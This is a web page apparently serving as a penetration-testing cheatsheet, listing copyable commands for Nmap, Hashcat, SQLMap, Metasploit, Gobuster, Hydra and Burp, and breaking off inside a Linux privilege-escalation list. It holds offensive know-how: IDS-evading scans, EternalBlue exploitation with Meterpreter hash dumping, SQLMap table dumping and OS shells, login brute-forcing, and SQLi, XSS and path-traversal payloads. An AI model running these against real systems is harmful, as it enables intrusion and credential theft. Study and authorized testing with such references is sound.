---
layout: page
title: Cheatsheet
permalink: /cheatsheet/
---

<style>
  body { background: #0d1117; }

  .cs-page { font-family: 'Courier New', monospace; max-width: 900px; margin: 0 auto; }

  /* Category tabs */
  .cs-tabs {
    display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 2rem;
  }
  .cs-tab {
    background: #0a1a0a;
    border: 1px solid #00ff4133;
    color: #4a7a4a;
    padding: 6px 16px;
    border-radius: 4px;
    cursor: pointer;
    font-size: 12px;
    letter-spacing: 1px;
    text-transform: uppercase;
    transition: all 0.15s;
    font-family: 'Courier New', monospace;
  }
  .cs-tab:hover { border-color: #00ff41; color: #00ff41; }
  .cs-tab.active { background: #00ff41; color: #000; border-color: #00ff41; font-weight: 700; }

  /* Tool section */
  .cs-section { display: none; }
  .cs-section.active { display: block; }

  .cs-tool-header {
    margin-bottom: 1.5rem;
  }
  .cs-tool-title {
    font-size: 2.2rem;
    font-weight: 900;
    color: #00ff41;
    letter-spacing: 2px;
    text-transform: uppercase;
    text-shadow: 0 0 20px rgba(0,255,65,0.3);
    margin-bottom: 0.3rem;
  }
  .cs-tool-desc { font-size: 13px; color: #4a7a4a; margin-bottom: 0; }

  /* Command block */
  .cs-block {
    background: #050f05;
    border: 1px solid #00ff4122;
    border-radius: 6px;
    margin-bottom: 2rem;
    overflow: hidden;
  }
  .cs-block-header {
    background: #0a1a0a;
    border-bottom: 1px solid #00ff4122;
    padding: 8px 14px;
    font-size: 11px;
    color: #4a7a4a;
    letter-spacing: 2px;
    text-transform: uppercase;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .cs-block-header::before { content: "//"; color: #00ff4166; }

  /* Command row */
  .cs-cmd-list { padding: 0.8rem 0; }
  .cs-cmd {
    display: flex;
    flex-direction: column;
    padding: 0.7rem 1.2rem;
    border-left: 3px solid #00ff41;
    margin: 0 1rem 0.8rem;
    background: #0a1a0a;
    border-radius: 0 4px 4px 0;
    cursor: pointer;
    transition: background 0.15s;
    position: relative;
  }
  .cs-cmd:hover { background: #0f240f; }
  .cs-cmd:last-child { margin-bottom: 0; }
  .cs-cmd-text {
    font-family: 'Courier New', monospace;
    font-size: 13px;
    color: #00ff41;
    font-weight: 700;
    word-break: break-all;
    padding-right: 60px;
  }
  .cs-cmd-desc {
    font-size: 12px;
    color: #aaa;
    margin-top: 4px;
    font-family: 'Courier New', monospace;
  }
  .cs-copy-btn {
    position: absolute;
    right: 10px;
    top: 50%;
    transform: translateY(-50%);
    background: transparent;
    border: 1px solid #00ff4133;
    color: #4a7a4a;
    font-size: 10px;
    padding: 3px 8px;
    border-radius: 3px;
    cursor: pointer;
    font-family: 'Courier New', monospace;
    letter-spacing: 1px;
    transition: all 0.15s;
  }
  .cs-copy-btn:hover { border-color: #00ff41; color: #00ff41; }
  .cs-copy-btn.copied { border-color: #00ff41; color: #00ff41; background: #071a11; }

  .cs-search {
    width: 100%;
    background: #050f05;
    border: 1px solid #00ff4133;
    border-radius: 6px;
    color: #00ff41;
    font-family: 'Courier New', monospace;
    font-size: 13px;
    padding: 10px 14px;
    outline: none;
    margin-bottom: 1.5rem;
    letter-spacing: 0.5px;
  }
  .cs-search:focus { border-color: #00ff41; }
  .cs-search::placeholder { color: #4a7a4a; }

  .cs-count {
    font-size: 11px;
    color: #4a7a4a;
    margin-bottom: 1rem;
    letter-spacing: 1px;
  }
  .cs-count span { color: #00ff41; }
</style>

<div class="cs-page">

  <input class="cs-search" id="cs-search" type="text" placeholder="$ search commands..." oninput="filterCommands(this.value)">

  <div class="cs-tabs" id="cs-tabs">
    <div class="cs-tab active" onclick="showTool('nmap')">Nmap</div>
    <div class="cs-tab" onclick="showTool('hashcat')">Hashcat</div>
    <div class="cs-tab" onclick="showTool('sqlmap')">SQLMap</div>
    <div class="cs-tab" onclick="showTool('metasploit')">Metasploit</div>
    <div class="cs-tab" onclick="showTool('gobuster')">Gobuster</div>
    <div class="cs-tab" onclick="showTool('hydra')">Hydra</div>
    <div class="cs-tab" onclick="showTool('burp')">Burp Suite</div>
    <div class="cs-tab" onclick="showTool('linux')">Linux Privesc</div>
  </div>

  <div class="cs-count" id="cs-count"></div>

  <!-- ══ NMAP ══════════════════════════════════════════ -->
  <div class="cs-section active" id="tool-nmap">
    <div class="cs-tool-header">
      <div class="cs-tool-title">🔍 Nmap</div>
      <div class="cs-tool-desc">Network Mapper — host discovery, port scanning, service &amp; OS detection</div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">Host Discovery</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">nmap -sn 192.168.1.0/24<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Ping sweep — discover live hosts without port scanning</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">nmap -Pn 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Skip host discovery — treat all hosts as online</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">nmap -sn --traceroute 192.168.1.0/24<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Ping sweep with traceroute to map network path</div></div>
      </div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">Port Scanning</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">nmap -p- 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Scan all 65535 ports on target</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">nmap -p 22,80,443 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Scan specific ports only</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">nmap -sS 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">SYN stealth scan — fast and less detectable</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">nmap -sU -p 53,161,162 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">UDP scan on common UDP ports</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">nmap --top-ports 1000 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Scan top 1000 most common ports</div></div>
      </div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">Service &amp; OS Detection</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">nmap -sV 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Detect service versions running on open ports</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">nmap -O 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">OS fingerprinting — identify target operating system</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">nmap -A 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Aggressive scan — OS, version, scripts, traceroute</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">nmap -sC -sV -p- 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Full scan with default scripts and version detection</div></div>
      </div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">NSE Scripts</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">nmap --script vuln 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Run all vulnerability detection scripts</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">nmap --script smb-vuln-ms17-010 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Check for EternalBlue / MS17-010 vulnerability</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">nmap --script http-enum 192.168.1.1 -p 80<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Enumerate web directories and files</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">nmap --script ssl-heartbleed 192.168.1.1 -p 443<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Check for Heartbleed SSL vulnerability</div></div>
      </div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">Output &amp; Speed</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">nmap -oN output.txt 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Save results to normal text file</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">nmap -oX output.xml 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Save results in XML format</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">nmap -T4 -A 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Aggressive timing template — faster scan</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">nmap -T1 --scan-delay 5s 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Slow scan to evade IDS/IPS detection</div></div>
      </div>
    </div>
  </div>

  <!-- ══ HASHCAT ════════════════════════════════════════ -->
  <div class="cs-section" id="tool-hashcat">
    <div class="cs-tool-header">
      <div class="cs-tool-title">🔑 Hashcat</div>
      <div class="cs-tool-desc">World's fastest password cracker — GPU-accelerated hash cracking</div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">Dictionary Attacks</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -a 0 -m 0 hashes.txt rockyou.txt<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Basic dictionary attack on MD5 hashes</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -a 0 -m 1000 hashes.txt rockyou.txt<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Crack NTLM hashes — common in Windows environments</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -a 0 -m 1800 hashes.txt rockyou.txt<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Crack SHA-512 Linux shadow file hashes</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -a 0 -m 0 hashes.txt rockyou.txt -r rules/best64.rule<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Apply rules to wordlist for more combinations</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -a 0 -m 0 hashes.txt rockyou.txt -o cracked.txt<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Save cracked passwords to output file</div></div>
      </div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">Brute Force &amp; Mask Attacks</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -a 3 -m 0 hashes.txt ?d?d?d?d?d?d<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Brute-force 6-digit PIN using mask attack</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -a 3 -m 0 hashes.txt ?u?l?l?l?d?d<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Mask: uppercase + 3 lowercase + 2 digits pattern</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -a 3 -m 0 hashes.txt ?a?a?a?a?a?a?a?a<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Brute-force all 8-char combinations (all charsets)</div></div>
      </div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">Session &amp; Status</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -a 0 -m 0 hashes.txt rockyou.txt --session mycrack<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Start a named session to pause and resume later</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat --session mycrack --restore<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Resume a previously saved cracking session</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat --session mycrack --status<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Check progress of a running or paused session</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat hashes.txt --show<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Display already cracked passwords from hash file</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat hashes.txt --left<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Show only uncracked hashes remaining</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -a 0 -m 0 hashes.txt rockyou.txt -O<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Enable optimized kernels for faster cracking speed</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -a 0 -m 0 hashes.txt rockyou.txt --force<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Ignore warnings and force the cracking process</div></div>
      </div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">Hash Type Reference</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -m 0    # MD5<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">MD5 — most common, 32 hex chars</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -m 100  # SHA1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">SHA-1 — 40 hex chars</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -m 1000 # NTLM<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">NTLM — Windows password hashes</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -m 1800 # sha512crypt<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Linux /etc/shadow SHA-512</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -m 3200 # bcrypt<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">bcrypt — slow hash used in web apps</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashcat -m 13100 # Kerberoast<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Kerberos 5 TGS-REP etype 23 — AD attacks</div></div>
      </div>
    </div>
  </div>

  <!-- ══ SQLMAP ════════════════════════════════════════ -->
  <div class="cs-section" id="tool-sqlmap">
    <div class="cs-tool-header">
      <div class="cs-tool-title">💉 SQLMap</div>
      <div class="cs-tool-desc">Automatic SQL injection detection and exploitation tool</div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">Basic Detection</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">sqlmap -u "http://target.com/page?id=1"<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Basic SQLi test on GET parameter</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">sqlmap -u "http://target.com/page?id=1" --dbs<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Enumerate all available databases</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">sqlmap -u "http://target.com/page?id=1" -D dbname --tables<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">List all tables in specified database</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Dump contents of the users table</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">sqlmap -u "http://target.com/page?id=1" --current-user --current-db<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Get current DB user and database name</div></div>
      </div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">POST &amp; Auth Requests</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">sqlmap -u "http://target.com/login" --data "user=admin&pass=test"<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Test SQLi in POST body parameters</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">sqlmap -u "http://target.com/" --cookie "PHPSESSID=abc123"<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Use session cookie for authenticated testing</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">sqlmap -r request.txt<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Load full HTTP request from Burp Suite saved file</div></div>
      </div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">Advanced Options</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">sqlmap -u "http://target.com/?id=1" --level=5 --risk=3<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Max aggressiveness — more payloads and tests</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">sqlmap -u "http://target.com/?id=1" --tamper=space2comment<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Use tamper script to bypass WAF filters</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">sqlmap -u "http://target.com/?id=1" --os-shell<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Attempt to get an interactive OS shell</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">sqlmap -u "http://target.com/?id=1" --batch<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Non-interactive mode — auto-answer all prompts</div></div>
      </div>
    </div>
  </div>

  <!-- ══ METASPLOIT ════════════════════════════════════ -->
  <div class="cs-section" id="tool-metasploit">
    <div class="cs-tool-header">
      <div class="cs-tool-title">💀 Metasploit</div>
      <div class="cs-tool-desc">The world's most used penetration testing framework</div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">MSFconsole Basics</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">msfconsole<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Launch the Metasploit Framework console</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">search type:exploit name:eternalblue<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Search for exploits by name or keyword</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">use exploit/windows/smb/ms17_010_eternalblue<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Select the EternalBlue SMB exploit module</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">show options<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Display all required and optional module settings</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">set RHOSTS 192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Set the target host IP address</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">set LHOST 192.168.1.100<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Set local host for reverse shell callback</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">run<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Execute the selected exploit module</div></div>
      </div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">Meterpreter Shell</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">sysinfo<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Get target system information</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">getuid<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Get current user on compromised system</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">getsystem<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Attempt privilege escalation to SYSTEM</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hashdump<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Dump Windows password hashes from SAM</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">upload /path/to/file C:\\Windows\\Temp<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Upload a file to the target system</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">download C:\\Users\\Admin\\file.txt<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Download a file from the target system</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">shell<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Drop into a native OS command shell</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">run post/multi/recon/local_exploit_suggester<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Suggest local privilege escalation exploits</div></div>
      </div>
    </div>
  </div>

  <!-- ══ GOBUSTER ════════════════════════════════════════ -->
  <div class="cs-section" id="tool-gobuster">
    <div class="cs-tool-header">
      <div class="cs-tool-title">🚀 Gobuster</div>
      <div class="cs-tool-desc">Directory, file, DNS and vhost brute-forcing tool</div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">Directory &amp; File Fuzzing</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Basic directory brute force with common wordlist</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">gobuster dir -u http://target.com -w common.txt -x php,html,txt<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Fuzz for specific file extensions</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">gobuster dir -u http://target.com -w common.txt -t 50<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Use 50 threads for faster scanning</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">gobuster dir -u http://target.com -w common.txt -o results.txt<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Save results to output file</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">gobuster dir -u http://target.com -w common.txt -s 200,301,302<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Only show specific HTTP status codes</div></div>
      </div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">DNS &amp; VHost Enumeration</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">gobuster dns -d target.com -w subdomains.txt<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Subdomain enumeration via DNS brute force</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">gobuster vhost -u http://target.com -w subdomains.txt<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Virtual host discovery on a web server</div></div>
      </div>
    </div>
  </div>

  <!-- ══ HYDRA ══════════════════════════════════════════ -->
  <div class="cs-section" id="tool-hydra">
    <div class="cs-tool-header">
      <div class="cs-tool-title">🐉 Hydra</div>
      <div class="cs-tool-desc">Fast and flexible online password brute-forcing tool</div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">Common Service Attacks</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">hydra -l admin -P rockyou.txt ssh://192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Brute force SSH with known username</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hydra -L users.txt -P rockyou.txt ftp://192.168.1.1<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Brute force FTP with userlist and passlist</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hydra -l admin -P rockyou.txt 192.168.1.1 smb<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Brute force SMB / Windows share login</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hydra -l admin -P rockyou.txt 192.168.1.1 rdp<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Brute force Remote Desktop Protocol (RDP)</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hydra -l admin -P rockyou.txt 192.168.1.1 mysql<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Brute force MySQL database login</div></div>
      </div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">HTTP Form Attacks</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Brute force HTTP POST login form</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">hydra -l admin -P rockyou.txt -t 4 -vV target.com http-get<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">HTTP GET basic auth with verbose output</div></div>
      </div>
    </div>
  </div>

  <!-- ══ BURP ════════════════════════════════════════════ -->
  <div class="cs-section" id="tool-burp">
    <div class="cs-tool-header">
      <div class="cs-tool-title">🕷️ Burp Suite</div>
      <div class="cs-tool-desc">Web application security testing platform — proxy, scanner, intruder</div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">Useful Keyboard Shortcuts</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">Ctrl+R → Send to Repeater<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Send intercepted request to Repeater tab for manual testing</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">Ctrl+I → Send to Intruder<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Send request to Intruder for automated fuzzing</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">Ctrl+U → URL Encode selection<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">URL-encode selected text in request editor</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">Ctrl+Shift+U → URL Decode<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">URL-decode selected text</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">F12 → Toggle Intercept<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Turn proxy intercept on or off</div></div>
      </div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">SQLi Payloads to Test in Repeater</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">' OR 1=1--<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Classic SQL injection bypass — always true condition</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">' UNION SELECT null,null,null--<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">UNION-based SQLi to determine number of columns</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">1' AND SLEEP(5)--<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Time-based blind SQLi detection — 5 second delay</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Basic XSS payload — test for reflected XSS</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">../../../etc/passwd<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Path traversal to read /etc/passwd on Linux</div></div>
      </div>
    </div>
  </div>

  <!-- ══ LINUX PRIVESC ════════════════════════════════════ -->
  <div class="cs-section" id="tool-linux">
    <div class="cs-tool-header">
      <div class="cs-tool-title">🐧 Linux Privesc</div>
      <div class="cs-tool-desc">Privilege escalation enumeration commands for Linux systems</div>
    </div>

    <div class="cs-block">
      <div class="cs-block-header">System Enumeration</div>
      <div class="cs-cmd-list">
        <div class="cs-cmd"><div class="cs-cmd-text">id && whoami && hostname<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Get current user, groups, and hostname</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">uname -a<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">Get full kernel version and OS info</div></div>
        <div class="cs-cmd"><div class="cs-cmd-text">cat /etc/passwd | grep -v nologin<button class="cs-copy-btn" onclick="copyCmd(this)">copy</button></div><div class="cs-cmd-desc">List users that can log in to the system</div></div>
